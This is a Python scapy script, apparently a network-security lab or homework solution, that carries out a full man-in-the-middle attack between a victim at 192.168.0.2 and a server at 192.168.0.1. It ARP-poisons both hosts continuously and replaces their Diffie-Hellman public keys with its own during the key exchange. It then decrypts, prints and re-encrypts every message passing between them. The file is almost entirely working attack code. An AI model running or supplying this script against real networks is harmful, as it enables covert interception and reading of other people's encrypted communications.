import hashlib
from base64 import b64decode, b64encode
from scapy.all import *
import json
import multiprocessing
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

interface = "nshw3-mitm-pc"
victimIP = "192.168.0.2"
serverIP = "192.168.0.1"
victimMAC = ""
serverMAC = ""
prime_number = None
generator = None  # my public key:  g ^ ( p - 100 ) mod p with padding
server_dh_key = None
client_dh_key = None
my_public_key = None


def encrypt(key, data):
    key = hashlib.md5(key).hexdigest()
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return b64encode(iv + cipher.encrypt(str(data).encode())).decode()


def decrypt(key, data):
    key = hashlib.md5(key).hexdigest()
    raw = b64decode(data)
    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])
    return cipher.decrypt(raw[AES.block_size:]).decode()


def dh_key_gen(pk):
    length = len(pk)
    pk = int(pk)
    p = int(prime_number)
    dh_key = str(pow(pk, p - 10, p))
    if len(dh_key) > length:
        raise ValueError('Wrong')
    else:
        dh_key = '0' * (length - len(dh_key)) + dh_key
    return dh_key


def my_pk_gen(length):
    global my_public_key
    p = int(prime_number)
    g = int(generator)
    my_pk = str(pow(g, p - 10, p))
    if len(my_pk) > length:
        raise ValueError('Wrong')
    else:
        my_pk = '0' * (length - len(my_pk)) + my_pk
    my_public_key = my_pk


def get_key(dh_key):
    dh_key = int(dh_key)
    shared_secret_bytes = dh_key.to_bytes(dh_key.bit_length() // 8 + 1, byteorder="big")
    s = hashlib.sha256()
    s.update(bytes(shared_secret_bytes))
    return s.digest()


def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


def poison():
    while True:
        send(ARP(op=2, psrc=serverIP, pdst=victimIP, hwdst=victimMAC))
        send(ARP(op=2, psrc=victimIP, pdst=serverIP, hwdst=serverMAC))
        time.sleep(1)


def callback(packet):
    if packet[Ether].src == victimMAC or packet[Ether].src == serverMAC:  # Not others!

        global prime_number
        global generator
        global server_dh_key
        global client_dh_key

        # Necessary things
        packet[Ether].src = packet[Ether].dst
        if packet[IP].dst == victimIP:
            packet[Ether].dst = victimMAC
        elif packet[IP].dst == serverIP:
            packet[Ether].dst = serverMAC
        del (packet[IP].chksum)
        del (packet[TCP].chksum)

        # extract payload if available
        try:
            payload = str(packet[IP].load)[2:-1]
            try:
                payload = json.loads(payload)
            except:
                pass
        except:
            payload = ''

        if type(payload) is str:
            is_json = False
        else:
            is_json = True

        # Filtering packets
        SYN = 0x02
        ACK = 0x10
        PSH = 0x08

        F = packet['TCP'].flags  # this should give you an integer

        if F & SYN:
            print("SYN SNIFF: packet sent from", packet[Ether].src, "to", packet[Ether].dst)
            sendp(packet, iface="nshw3-mitm-pc")

        elif (F & ACK) and (F & PSH):

            if payload == 'Hello':
                # rely to server unchanged
                sendp(packet, iface='nshw3-mitm-pc')

            elif is_json:

                if prime_number is None:  # Start DH key-exchange by Server
                    print("PSH ACK SNIFF | Start DH key-exchange by server: packet sent from", packet[Ether].src, "to", packet[Ether].dst)

                    # extract data
                    data = payload["dh-keyexchange"]
                    prime_number = data['prime']
                    generator = data["generator"]
                    server_pk = data['publicKey']

                    # create private key d , create key for server cipher
                    my_pk_gen(len(server_pk))
                    global server_dh_key
                    server_dh_key = dh_key_gen(server_pk)

                    # send original packet with new public key
                    data['publicKey'] = my_public_key
                    packet[IP].load = '{"dh-keyexchange":' + json.dumps(data, separators=(',', ': ')) + '}'
                    sendp(packet, iface='nshw3-mitm-pc')

                else:  # Continue D-H key exchange from client
                    print("PSH ACK SNIFF | Continue DH key-exchange by client: packet sent from", packet[Ether].src, "to", packet[Ether].dst)
                    # crete key for client cipher
                    data = payload["dh-keyexchange"]
                    client_pk = data['publicKey']

                    global client_dh_key
                    client_dh_key = dh_key_gen(client_pk)

                    # send public key for server cipher
                    data['publicKey'] = my_public_key
                    packet[IP].load = '{"dh-keyexchange":' + json.dumps(data, separators=(',', ': ')) + '}'
                    sendp(packet, iface='nshw3-mitm-pc')

            else:
                if packet[IP].src == victimIP:
                    print("PSH ACK SNIFF | A cipher from client: packet sent from ", packet[Ether].src, "to", packet[Ether].dst)
                    # decrypt with client cipher
                    client_key = get_key(client_dh_key)
                    message_dec = decrypt(client_key, payload)
                    print("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDecrypted")
                    print(message_dec)
                    print("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDecrypted")

                    # encrypt with server cipher and send
                    server_key = get_key(server_dh_key)
                    message_enc = encrypt(server_key, message_dec)
                    packet[IP].load = message_enc
                    sendp(packet, iface='nshw3-mitm-pc')

                else:
                    print("PSH ACK SNIFF | A cipher from server: packet sent from ", packet[Ether].src, "to", packet[Ether].dst)
                    # decrypt with server cipher
                    server_key = get_key(server_dh_key)
                    message_dec = decrypt(server_key, payload)
                    print("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDecrypted")
                    print(message_dec)
                    print("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDecrypted")

                    # encrypt with client cipher and send
                    client_key = get_key(client_dh_key)
                    message_enc = encrypt(client_key, message_dec)
                    packet[IP].load = message_enc
                    sendp(packet, iface='nshw3-mitm-pc')

        elif F & ACK:
            print("ACK SNIFF: packet sent from", packet[Ether].src, "to", packet[Ether].dst)
            sendp(packet, iface="nshw3-mitm-pc")

        else:
            print("SNIFF: UNEXPECTED")


def mitm():

    print("MITM: Finding MACs ... ")
    global victimMAC
    global serverMAC
    victimMAC = get_mac(victimIP)
    serverMAC = get_mac(serverIP)

    print("MITM: Sending ARP ... ")
    multiprocessing.Process(target=poison).start()

    print("MITM: Sniffing ...")
    sniff(iface="nshw3-mitm-pc", filter="tcp", prn=callback, store=0)


mitm()
